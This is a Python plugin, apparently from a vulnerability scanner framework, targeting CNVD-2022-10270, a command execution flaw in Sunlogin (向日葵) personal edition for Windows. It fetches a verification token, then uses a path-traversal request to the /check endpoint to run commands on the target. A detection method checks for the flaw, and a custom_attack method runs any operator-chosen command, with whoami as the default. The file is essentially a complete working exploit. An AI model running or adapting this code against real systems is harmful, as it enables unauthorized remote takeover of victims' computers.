# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "向日葵个人版for Windows存在命令执行漏洞",
        "description": "上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞, 攻击者可利用该漏洞获取服务器控制权",
        "datetime": "2022-02-17"
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./cgi-bin/rpc?action=verify-haras',
            timeout=15
        )
        if 'verify_string' in r.text:
            token = r.json()['verify_string']
            r = self.request(
                method='get',
                path='./check?cmd=ping../../../../../../../../../../../windows/system32/help',
                timeout=15,
                headers={"Cookie": f"CID={token}"}
            )
            if 'WMIC' in r.text:
                return {
                    "LoopholeInfo": {"app": "向日葵", "name": "CNVD-2022-10270"}
                }

    @cli.options("url", desc="攻击目标", default="{self.target.value}")
    @cli.options("cmd", desc="执行命令", default="whoami")
    def custom_attack(self, url, cmd):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(
                url,
                './cgi-bin/rpc?action=verify-haras'
            ),
            timeout=15
        )
        if 'verify_string' in r.text:
            token = r.json()['verify_string']
            r = self.request(
                method='get',
                url=urllib.parse.urljoin(
                    url,
                    f'./check?cmd=ping../../../../../../../../../../../windows/system32/{cmd}'
                ),
                timeout=15,
                headers={"Cookie": f"CID={token}"}
            )
            return r.text
